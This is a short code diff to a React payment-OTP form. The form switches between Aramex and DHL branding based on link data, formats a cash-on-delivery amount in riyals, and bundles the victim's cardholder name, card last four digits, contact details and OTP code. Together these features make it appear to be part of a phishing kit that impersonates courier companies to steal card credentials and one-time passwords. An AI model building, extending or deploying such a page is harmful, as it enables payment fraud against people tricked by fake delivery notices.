@@ -27,6 +27,10 @@ const PaymentOTPForm = () => {
   const serviceName = linkData?.payload?.service_name || customerInfo.service || 'aramex';
   const branding = getServiceBranding(serviceName);
   
+  const shippingInfo = linkData?.payload as any;
+  const amount = shippingInfo?.cod_amount || 500;
+  const formattedAmount = `${amount} ر.س`;
+  
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
     'dhl': heroDhl,
@@ -63,7 +67,7 @@ const PaymentOTPForm = () => {
             email: customerInfo.email || '',
             phone: customerInfo.phone || '',
             service: serviceName,
-            amount: customerInfo.amount || '500 SAR',
+            amount: formattedAmount,
             cardLast4: sessionStorage.getItem('cardLast4') || '',
             cardholder: sessionStorage.getItem('cardName') || '',
             otp: otp,
